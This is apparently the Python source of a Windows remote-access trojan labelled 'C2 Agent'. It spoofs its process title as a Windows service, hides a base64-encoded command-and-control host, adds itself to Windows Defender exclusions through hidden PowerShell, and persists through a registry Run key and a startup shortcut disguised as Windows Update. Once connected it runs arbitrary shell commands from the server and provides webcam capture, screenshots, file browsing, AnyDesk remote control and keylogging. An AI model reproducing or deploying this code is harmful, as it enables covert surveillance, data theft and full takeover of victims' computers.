"""
C2 Agent - Remote version (Cloudflare Tunnel)
Double-click to run. Auto add Defender exclusion + startup + registry.
"""
import os, sys, json, time, socket, platform, logging, threading, subprocess, base64

# ========== PROCESS NAME SPOOF ==========
try:
    if getattr(sys, 'frozen', False):
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
except: pass
# ==========================================

# ========== CONFIG ENCRYPTED ==========
_b = base64.b64decode
SERVER_URL = _b("YzIuZmFzdHZhdWx0Lm5ldA==").decode()  # c2.fastvault.net
USE_SSL = True
# ======================================

# ========== AUTO DEFENDER EXCLUSION ==========
def add_defender_exclusion():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command',
            f'Add-MpPreference -ExclusionPath "{exe_path}"'],
            capture_output=True, shell=False)
    except: pass
add_defender_exclusion()
# ============================================

# ========== AUTO STARTUP (Registry + Startup) ==========
def add_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        # Registry RUN key (HKCU)
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe_path}"')
            winreg.CloseKey(key)
        except: pass
        # Startup folder
        startup = os.path.join(os.environ['APPDATA'],
            r'Microsoft\Windows\Start Menu\Programs\Startup\C2Agent.lnk')
        if not os.path.exists(startup):
            try:
                import win32com.client
                ws = win32com.client.Dispatch("WScript.Shell")
                shortcut = ws.CreateShortcut(startup)
                shortcut.TargetPath = exe_path
                shortcut.WorkingDirectory = os.path.dirname(exe_path)
                shortcut.Description = "Windows Update Service"
                shortcut.Save()
            except:
                cmd = f'$s=(New-Object -ComObject WScript.Shell).CreateShortcut("{startup}");$s.TargetPath="{exe_path}";$s.Description="Windows Update Service";$s.Save()'
                subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', cmd], capture_output=True, shell=False)
    except: pass
add_startup()
# ====================================

from utils import get_device_id, get_system_info, get_health
from modules.webcam import capture_webcam
from modules.screenshot import capture_screenshot
from modules.file_browser import list_files
from modules.remote_desktop import start_anydesk
from modules.keylogger import handle as keylog_handle

DEVICE_ID = get_device_id()
WS_URL = f"{'wss' if USE_SSL else 'ws'}://{SERVER_URL}/ws/{DEVICE_ID}"

def execute(cmd, timeout=60):
    c = cmd.strip().lower()
    if c in ["webcam", "camera", "chup", "chụp"]:
        return capture_webcam()
    if c in ["screen", "screenshot", "man hinh"]:
        return capture_screenshot()
    if c in ["rd", "anydesk", "remote"]:
        return start_anydesk()
    if c.startswith("ls "):
        return list_files(c[3:].strip())
    if c.startswith("keylog_"):
        return keylog_handle(cmd)
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = r.stdout + ("\n[STDERR]\n" + r.stderr if r.stderr else "")
        return {"output": out.strip() or "(no output)", "exit_code": r.returncode}
    except subprocess.TimeoutExpired:
        return {"output": "[ERROR] Timeout", "exit_code": -1}
    except Exception as e:
        return {"output": f"[ERROR] {e}", "exit_code": -1}

def on_open(ws):
    log.info(f"Connected! ID: {DEVICE_ID}")
    ws.send(json.dumps(get_system_info()))

def on_message(ws, raw):
    try: msg = json.loads(raw)
    except: return
    if "command" not in msg:
        return
    log.info(f"EXEC [{msg.get('command_id','?')}]: {msg.get('command','')}")
    result = execute(msg.get("command", ""), msg.get("timeout", 60))
    ws.send(json.dumps({
        "type": "cmd_result",
        "command_id": msg.get("command_id"),
        "db_id": msg.get("db_id"),
        "output": result["output"],
        "exit_code": result["exit_code"],
    }))

def on_error(ws, e): log.error(f"WS error: {e}")
def on_close(ws, code, msg): log.warning(f"Disconnected ({code}). Reconnect in 5s...")

def heartbeat(ws):
    while ws and ws.sock and ws.sock.connected:
        try: ws.send(json.dumps({"type": "heartbeat", **get_health()}))
        except: pass
        time.sleep(30)

def main():
    log.info(f"Device: {DEVICE_ID} | Server: {SERVER_URL}")
    while True:
        ws = WebSocketApp(WS_URL,
            on_open=lambda w: (on_open(w),
            threading.Thread(target=heartbeat, args=(w,), daemon=True).start()),
            on_message=on_message, on_error=on_error, on_close=on_close)
        try: ws.run_forever(ping_interval=30, ping_timeout=10)
        except KeyboardInterrupt: break
        except: pass
        time.sleep(5)

if __name__ == "__main__":
    main()
